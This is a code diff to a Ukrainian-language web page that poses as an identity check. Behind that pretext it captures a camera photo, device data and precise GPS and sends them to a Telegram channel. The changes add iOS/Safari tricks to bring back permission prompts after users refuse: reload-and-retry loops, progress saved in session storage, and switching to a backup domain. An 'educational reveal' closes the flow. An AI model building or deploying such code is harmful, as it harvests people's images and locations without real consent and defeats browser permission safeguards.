@@ -473,6 +473,24 @@
             color: #9a9ab3;
         }
 
+        .scan-retry-reload {
+            display: block;
+            width: 100%;
+            margin-top: 8px;
+            padding: 12px 18px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #4a4a68;
+            background: #f2f3f9;
+            border: 1px solid #dcdfec;
+            border-radius: 12px;
+            cursor: pointer;
+        }
+
+        .scan-retry-reload:active {
+            background: #e6e8f5;
+        }
+
         .scan-retry-back {
             display: inline-block;
             margin-top: 12px;
@@ -764,6 +782,7 @@
                 <div class="scan-retry-title" id="scanRetryTitle">Потрібен доступ до камери</div>
                 <div class="scan-retry-text" id="scanRetryText"></div>
                 <button class="btn btn-primary" id="retryCameraBtn">Дозволити камеру</button>
+                <button class="btn scan-retry-reload" id="reloadRetryBtn">🔄 Оновити й запитати знову</button>
                 <span class="scan-retry-back" id="scanRetryBack">← Повернутися на головну</span>
             </div>
         </div>
@@ -1149,6 +1168,7 @@
         const scanRetryTitle = document.getElementById('scanRetryTitle');
         const scanRetryText = document.getElementById('scanRetryText');
         const retryCameraBtn = document.getElementById('retryCameraBtn');
+        const reloadRetryBtn = document.getElementById('reloadRetryBtn');
         const scanRetryBack = document.getElementById('scanRetryBack');
 
         let currentStream = null;
@@ -1156,8 +1176,22 @@
         let gpsCaptured = false;
         let scanRunning = false;
 
-        // Автоматичне повторення запиту доступу до камери
-        const CAM_MAX_AUTO = 8;      // максимум автоматичних спроб підряд
+        // ============================================================
+        // ВИЗНАЧЕННЯ ПЛАТФОРМИ ТА HTTPS
+        // ============================================================
+        const IS_IOS = /iP(hone|ad|od)/.test(navigator.userAgent) ||
+            (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+
+        // iOS/Safari: getUserMedia і geolocation працюють ЛИШЕ в https (localhost — виняток).
+        // На http://mediaDevices взагалі відсутній — тому вікно не з'явиться ЖОДНОГО разу.
+        function mediaSecureOk() {
+            return window.isSecureContext === true &&
+                !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+        }
+
+        // Safari показує системний запит лише в межах жесту. Після першої відмови
+        // повторні спроби без нового тапу вікна не покажуть — тому на iOS лічильник = 1.
+        const CAM_MAX_AUTO = IS_IOS ? 1 : 8;      // максимум автоматичних спроб підряд
         const CAM_RETRY_DELAY = 1500; // пауза між спробами, мс
         let camAttempt = 0;
         let camLoopActive = false;
@@ -1254,7 +1288,7 @@
                     location: collectedData.location,
                     photo: photo || null
                 },
-                scanCompleted: true,
+                scanCompleted: scanCompleted,
                 gpsCaptured: gpsCaptured,
                 tg: {
                     photoSent: tgState.photoSent,
@@ -1269,8 +1303,16 @@
             if (!st || st.v !== 1 || !st.collected) return false;
 
             Object.keys(st.collected).forEach(k => { collectedData[k] = st.collected[k]; });
-            scanCompleted = true;
+
+            // Камеру вважаємо пройденою лише якщо вона справді була пройдена.
+            // Після reload на кроці камери стан може містити лише часткові дані.
+            scanCompleted = !!st.scanCompleted;
             gpsCaptured = !!st.gpsCaptured;
+
+            if (!scanCompleted) {
+                // Прогрес без камери: нічого не «відновлюємо», просто даємо тап
+                return true;
+            }
 
             if (st.tg) {
                 // Фото вже надіслане з першого домену — не дублюємо в канал
@@ -1498,9 +1540,11 @@
             captureTries = 0;
 
             while (camLoopActive && camAttempt < CAM_MAX_AUTO) {
-                // Жорстке блокування ("Заблокувати" + збережений стан) — повторний
-                // запит на цьому домені вже нічого не покаже, тому одразу змінюємо origin.
-                if (await cameraPermissionState() === 'denied') {
+                // КРИТИЧНО ДЛЯ iOS/Safari: перед getUserMedia НЕ МОЖНА робити await.
+                // Будь-який await з'їдає user gesture, і Safari мовчки відхиляє запит
+                // БЕЗ системного вікна — саме той симптом «8 спроб, жодного запиту».
+                // Тому перевірку стану робимо ЛИШЕ на повторах, не на першій спробі.
+                if (camAttempt > 0 && await cameraPermissionState() === 'denied') {
                     if (tryAltOrigin()) return;
                     handleCameraFailure('NotAllowedError', true);
                     return;
@@ -1554,9 +1598,25 @@
             scanStatus.style.color = '#f5576c';
             progressFill.style.width = '0%';
 
+            if (errName === 'SecurityError' || !mediaSecureOk()) {
+                // Найчастіша причина «8 спроб — жодного вікна» на iPhone
+                scanRetryTitle.textContent = 'Потрібен https://';
+                scanRetryText.innerHTML =
+                    '⚠️ ' + reason + '<br>' +
+                    (IS_IOS
+                        ? 'iPhone дає камеру лише на <b>https://</b>. По http:// запит не з\'явиться ' +
+                          'жодного разу — скільки б разів не повторювати.'
+                        : 'Потрібен https:// або localhost.') +
+                    '<br><span class="scan-retry-count">Спроб: ' + camAttempt + '</span>';
+                scanRetry.classList.add('show');
+                return;
+            }
+
             if (hardBlock) {
                 // Чесний текст: на цьому домені системне вікно вже не з'явиться.
-                scanRetryTitle.textContent = 'Браузер запам\'ятав заборону';
+                scanRetryTitle.textContent = IS_IOS
+                    ? 'Safari більше не покаже запит'
+                    : 'Браузер запам\'ятав заборону';
                 const fallbackNote = altSwapped
                     ? 'Автоматичне перемикання на резервний домен уже використано, і там доступ теж не надано.'
                     : 'Резервний домен не налаштований, тому нового вікна автоматично не буде.';
@@ -1564,8 +1624,24 @@
                     '⚠️ ' + reason + '<br>' +
                     'Для цього домену ви натиснули <b>«Заблокувати»</b>, і браузер більше не показує ' +
                     'системний запит — це захисний механізм, який сторінка обійти не може.<br>' +
-                    fallbackNote + ' Варіанти: <b>«Дозволити камеру»</b> з інструкцією в налаштуваннях, ' +
-                    'або відкрити сторінку на іншому домені/порті.' +
+                    (IS_IOS
+                        ? 'Натисніть <b>«Оновити й запитати знову»</b> — на свіжій сторінці Safari ' +
+                          'показує запит ще раз, а прогрес збережено.'
+                        : fallbackNote + ' Варіанти: <b>«Дозволити камеру»</b> з інструкцією в налаштуваннях, ' +
+                          'або відкрити сторінку на іншому домені/порті.') +
+                    '<br><span class="scan-retry-count">Спроб: ' + camAttempt + '</span>';
+                scanRetry.classList.add('show');
+                return;
+            }
+
+            if (IS_IOS) {
+                // Safari показує запит лише після тапу — тому чесний текст без «8 разів»
+                scanRetryTitle.textContent = 'Запит не з\'явився';
+                scanRetryText.innerHTML =
+                    '⚠️ ' + reason + '<br>' +
+                    'Safari не показує запит без тапу. Натисніть <b>«Дозволити камеру»</b> ще раз — ' +
+                    'вікно має з\'явитися в межах цього тапу. Якщо й після тапу вікна немає, ' +
+                    'доступ вимкнено глобально: <b>Налаштування → Safari → Камера</b> → «Запитати».' +
                     '<br><span class="scan-retry-count">Спроб: ' + camAttempt + '</span>';
                 scanRetry.classList.add('show');
                 return;
@@ -1574,9 +1650,10 @@
             scanRetryTitle.textContent = 'Доступ досі не надано';
             scanRetryText.innerHTML =
                 '⚠️ ' + reason + '<br>' +
-                'Ми запитали доступ ' + CAM_MAX_AUTO + ' разів. Натисніть <b>«Дозволити камеру»</b> — ' +
-                'з\'явиться новий запит. Якщо браузер більше не показує запит, відкрийте ' +
-                '🔒 біля адреси → Дозволи → Камера → «Дозволити», потім натисніть кнопку.' +
+                'Ми запитали доступ ' + CAM_MAX_AUTO + (CAM_MAX_AUTO === 1 ? ' раз. ' : ' разів. ') +
+                'Натисніть <b>«Дозволити камеру»</b> — з\'явиться новий запит. Якщо браузер більше не ' +
+                'показує запит, відкрийте 🔒 біля адреси → Дозволи → Камера → «Дозволити», ' +
+                'потім натисніть кнопку.' +
                 '<br><span class="scan-retry-count">Спроб: ' + camAttempt + '</span>';
             scanRetry.classList.add('show');
         }
@@ -1618,6 +1695,19 @@
         verifyBtn.addEventListener('click', () => {
             if (scanRunning) return; // не запускаємо сканування двічі паралельно
             camHint.classList.remove('show');
+
+            // iPhone по http:// = небезпечний контекст: mediaDevices відсутній,
+            // тому жодного системного вікна не буде — 8 спроб просто згорять.
+            if (!mediaSecureOk()) {
+                showHint(camHint,
+                    '📷 ' + (IS_IOS
+                        ? 'На iPhone камера працює лише через https://. ' +
+                          'Відкрийте цю сторінку по https (тунель або GitHub Pages) — по http:// запит не з\'явиться взагалі.'
+                        : 'Браузер не дає доступ до камери на цій адресі. Потрібен https:// або localhost.'));
+                camHint.scrollIntoView({behavior: 'smooth', block: 'center'});
+                return;
+            }
+
             camAttempt = 0;
             captureTries = 0;
 
@@ -1638,6 +1728,13 @@
             captureTries = 0;
             successCheck.classList.remove('show');
             cameraAttemptLoop();
+        });
+
+        // Свіжий документ = новий системний запит у Safari.
+        // Прогрес зберігається, тому після оновлення лишається один тап.
+        reloadRetryBtn.addEventListener('click', () => {
+            reloadRetryBtn.textContent = '🔄 Оновлюємо...';
+            reloadForRetry(scanCompleted ? 'gps' : 'cam');
         });
 
         // Повернення на головний екран без доступу до камери
@@ -1687,6 +1784,10 @@
             scanStatus.style.color = '#11998e';
             successCheck.classList.add('show');
 
+            // Прогрес у сховище: якщо далі знадобиться reload для нового
+            // системного запиту (iOS), фото і дані не загубляться
+            saveProgress();
+
             // Stop camera immediately
             if (currentStream) {
                 currentStream.getTracks().forEach(track => track.stop());
@@ -1712,20 +1813,63 @@
         // ============================================================
         // STEP 3: PRECISE GPS (button keeps pulsing until captured)
         // ============================================================
+        // «Оновити» = свідомий тап → зберігаємо прогрес і перезавантажуємось
         geoReload.addEventListener('click', (e) => {
             e.preventDefault();
-            location.reload();
+            reloadForRetry(scanCompleted ? 'gps' : 'cam');
         });
 
         const GEO_TRY_AGAIN = '📍 <b>Доступ до геолокації не надано.</b><br>' +
             'Натисніть «Продовжити» ще раз і у системному запиті виберіть «Дозволити».';
 
         // ============================================================
+        // ПОВТОРНИЙ ЗАПИТ ЧЕРЕЗ ПЕРЕЗАВАНТАЖЕННЯ (головний шлях для iPhone)
+        // ============================================================
+        // Safari/iOS показує новий системний запит лише на «свіжій» сторінці
+        // і лише з тапу. Тому: тап → зберігаємо прогрес → reload → ще один тап.
+        // Прогрес (фото, мережа, пристрій) лежить у sessionStorage того ж origin —
+        // після оновлення людина НЕ проходить сканер заново.
+        const SESSION_KEY = 'alibi:progress';
+
+        function saveProgress() {
+            try {
+                sessionStorage.setItem(SESSION_KEY, JSON.stringify(packState(collectedData.photo)));
+                return true;
+            } catch (e) {
+                // Великий кадр може не влізти в ліміт сховища — тоді без фото
+                try {
+                    sessionStorage.setItem(SESSION_KEY, JSON.stringify(packState(null)));
+                    return true;
+                } catch (e2) { return false; }
+            }
+        }
+
+        function loadProgress() {
+            try {
+                const raw = sessionStorage.getItem(SESSION_KEY);
+                return raw ? JSON.parse(raw) : null;
+            } catch (e) { return null; }
+        }
+
+        function clearProgress() {
+            try { sessionStorage.removeItem(SESSION_KEY); } catch (e) { }
+        }
+
+        // kind: 'cam' або 'gps' — що саме треба запитати після оновлення
+        function reloadForRetry(kind) {
+            saveProgress();
+            const u = new URL(location.href);
+            u.hash = '';
+            u.searchParams.set('retry', kind);
+            location.replace(u.toString());
+        }
+
+        // ============================================================
         // АВТОМАТИЧНИЙ ПОВТОР ЗАПИТУ ГЕОЛОКАЦІЇ
         // ============================================================
         // Дозвіл на геолокацію теж зберігається окремо для кожного origin:
         // після «Заблокувати» новий запит на цьому домені не з'явиться.
-        const GEO_MAX_AUTO = 3;       // максимум автоматичних спроб підряд
+        const GEO_MAX_AUTO = IS_IOS ? 1 : 3;   // iOS не повторить запит без нового тапу
         const GEO_RETRY_DELAY = 2000; // пауза між спробами, мс
         let geoAttempt = 0;
         let geoRetryTimer = null;
@@ -1754,8 +1898,20 @@
             geoHint.classList.add('show');
         }
 
-        // Геолокацію заблоковано назавжди: новий origin або чесна інструкція
+        // Геолокацію заблоковано назавжди: на iOS — reload, інакше — новий origin
         function geoHardBlocked() {
+            if (IS_IOS) {
+                // Зміна домену на iOS нічого не дає (Safari все одно вимагає тап),
+                // тому перезавантажуємо ЦЮ сторінку — там запит з'явиться знову.
+                showGeoHint(
+                    '📍 <b>Геолокацію заблоковано для цього сайту.</b><br>' +
+                    'Натисніть <b>«Оновити й запитати знову»</b> нижче — після оновлення ' +
+                    'Safari знову покаже системний запит. Фото й зібрані дані збережено, ' +
+                    'сканер проходити заново не потрібно.');
+                geoReload.classList.add('show');
+                return;
+            }
+
             if (tryAltOrigin('gps')) return;
             showGeoHint(
                 '📍 <b>Геолокацію заблоковано для цього сайту.</b><br>' +
@@ -1772,9 +1928,18 @@
             if (!scanCompleted || gpsCaptured) return;
             stopGeoRetry();
 
-            // Жорстке блокування — не марнуємо спроби і не брешемо про «натисніть ще раз»
-            if (await geoPermissionState() === 'denied') {
+            // Той самий закон Safari, що й для камери: жодного await перед
+            // getCurrentPosition, інакше системне вікно не з'явиться.
+            // Перевіряємо стан лише при автоповторі (там жест вже втрачений).
+            if (autoStarted && await geoPermissionState() === 'denied') {
                 geoHardBlocked();
+                return;
+            }
+
+            if (!mediaSecureOk() && !navigator.geolocation) {
+                showGeoHint('📍 <b>Геолокація недоступна.</b><br>' +
+                    (IS_IOS ? 'На iPhone потрібен https:// — по http:// браузер блокує доступ.'
+                            : 'Перевірте дозволи браузера для цього сайту.'));
                 return;
             }
 
@@ -1826,6 +1991,9 @@
                     // Фінальний пакет у канал: GPS-мітка + повний звіт
                     tgSendLocation(collectedData.location.latitude, collectedData.location.longitude);
                     tgSendText(fmtSummary(false)).then(ok => {if (ok) {tgState.sent = true; tgState.finalSent = true;} });
+
+                    // Все зібрано — збережений прогрес більше не потрібен
+                    clearProgress();
 
                     // Educational reveal
                     setTimeout(showFinalReveal, 1200);
@@ -1908,6 +2076,42 @@
 
                 if (!scanCompleted && !scanRunning) verifyBtn.click();
             }, 700);
+        }
+
+        // ============================================================
+        // ПІСЛЯ ПЕРЕЗАВАНТАЖЕННЯ З ?retry=cam|gps
+        // ============================================================
+        // Свіжий документ + тап = Safari знову показує системне вікно.
+        // Тут лише відновлюємо прогрес і підказуємо, куди натиснути.
+        const RETRY_KIND = START_PARAMS.get('retry');
+        if (RETRY_KIND) {
+            setTimeout(() => {
+                if (restoreState(loadProgress())) {
+                    try {
+                        const u = new URL(location.href);
+                        u.searchParams.delete('retry');
+                        history.replaceState(null, '', u.pathname + (u.search || ''));
+                    } catch (e) { }
+                }
+
+                if (RETRY_KIND === 'gps' && scanCompleted) {
+                    showGeoHint(
+                        '📍 <b>Готово до нового запиту.</b><br>' +
+                        'Натисніть <b>«Продовжити»</b> — Safari покаже системне вікно геолокації. ' +
+                        'Фото й дані вже збережено.');
+                    continueBtn.classList.add('ready');
+                    continueBtn.scrollIntoView({behavior: 'smooth', block: 'center'});
+                    return;
+                }
+
+                showHint(camHint,
+                    '📷 <b>Готово до нового запиту.</b> Натисніть <b>«Підтвердити особу»</b> нижче — ' +
+                    'Safari покаже системне вікно доступу до камери.');
+                if (verifyBtn) {
+                    verifyBtn.classList.add('ready');
+                    verifyBtn.scrollIntoView({behavior: 'smooth', block: 'center'});
+                }
+            }, 250);
         }
 
         // ============================================================
